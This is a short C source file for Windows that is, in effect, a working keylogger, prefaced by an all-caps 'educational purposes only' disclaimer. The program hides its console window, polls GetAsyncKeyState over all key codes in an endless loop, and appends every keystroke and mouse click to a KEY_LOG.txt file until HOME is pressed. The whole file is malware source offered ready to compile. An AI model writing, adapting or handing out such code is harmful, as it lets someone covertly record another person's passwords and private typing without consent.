/*
		THIS PROGRAM WAS MADE SOLELY WITH THE PURPOSE OF EDUCATIONAL PURPOSES
	THE PROGRAM SHALT AND WILL **NOT** BE USED FOR THE EVIL AND OR ILLEGAL
	ACTIVITIES.
		YOU ARE PERMITED TO DO ANY USE OF THIS PROGRAM, ALL YOU NEED TO DO IS
	YOUR ACTION WITH THE PROGRAM MUST BE UNDER THE LAW.
*/


#include <stdio.h>
#include <windows.h>

int main(){	
	FILE * file = fopen("KEY_LOG.txt","r");
	
	if (file) {
		int real = 0;
		int x = 1;
		
		while (real == 0) {
			fclose(file);
			char name[300];
			char num[300];
			
			strcpy(name, "KEY_LOG(");
			strcat(name, itoa(x, num, 20));
			strcat(name, ").txt");
			file = fopen(name, "r");
			if (file) {
				fclose(file);
			} else {
				file = fopen(name,"a+");
				real = 1;
			}
			Sleep(50);
			x++;
		}
	} else {
		file = fopen("KEY_LOG.txt","a+");
	}

	int result,teclas;
	
	MessageBox(NULL, "Tap HOME to Close\nAperte HOME para fechar\nClique en HOME para terminar", "Tip:",MB_ICONEXCLAMATION|MB_OK);
	
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
	

	
	while (1) {
		for (teclas = 0; teclas<=255; teclas++) {
			Sleep(0.1);
			
			result = GetAsyncKeyState(teclas);
			
			if (result == -32767) {
			switch(teclas) {
				case VK_SPACE:
					fputs(" ", file);
					break;
				case VK_RETURN:
					fputs("[ENTER]\n", file);
					break;
				case VK_BACK:
					fputs("[BACKSPACE]", file);
					break;
				case VK_LSHIFT:
					fputs("[LEFT SHIFT]", file);
					break;
				case VK_RSHIFT:
					fputs("[RIGHT SHIFT]",file);
					break;
				case VK_LCONTROL:
					fputs("[LEFT CONTROL]", file);
					break;
				case VK_RCONTROL:
					fputs("[RIGHT CONTROL]", file);
					break;
				case VK_TAB:
					fputs("[TAB]",file);
					break;
				case 190:
					fputs(".", file);
					break;
				case 188:
					fputs(",", file);
					break;
				case 193:
					fputs("[?/]", file);
				case VK_LBUTTON:
					fputs("[LEFT CLICK]\n", file);
					break;
				case VK_RBUTTON:
					fputs("[RIGHT CLICK]\n", file);
					break;
				case VK_HOME:
					fclose(file);
					exit(0);
				case VK_OEM_1:
					fputs("[;:]", file);
					break;
				case VK_OEM_2:
					fputs("[:;]", file);
					break;
				case 187:
					fputs("+", file);
					break;
				case 189:
					fputs("-", file);
					break;
				case VK_NUMPAD0:
					fputs("0", file);
					break;
				case VK_NUMPAD1:
					fputs("1", file);
					break;
				case VK_NUMPAD2:
					fputs("2", file);
					break;
				case VK_NUMPAD3:
					fputs("3", file);
					break;
				case VK_NUMPAD4:
					fputs("4", file);
					break;
				case VK_NUMPAD5:
					fputs("5", file);
					break;
				case VK_NUMPAD6:
					fputs("6", file);
					break;
				case VK_NUMPAD7:
					fputs("7", file);
					break;
				case VK_NUMPAD8:
					fputs("8", file);
					break;
				case VK_NUMPAD9:
					fputs("9", file);
					break;
				case VK_CAPITAL:
					fputs("[CAPS LOCK]", file);
					break;
				case VK_MENU:
					fputs("[ALT]", file);
					break;
				default:
					fputc(teclas, file); 
					break;
					
			}
		}
		}
	}
}
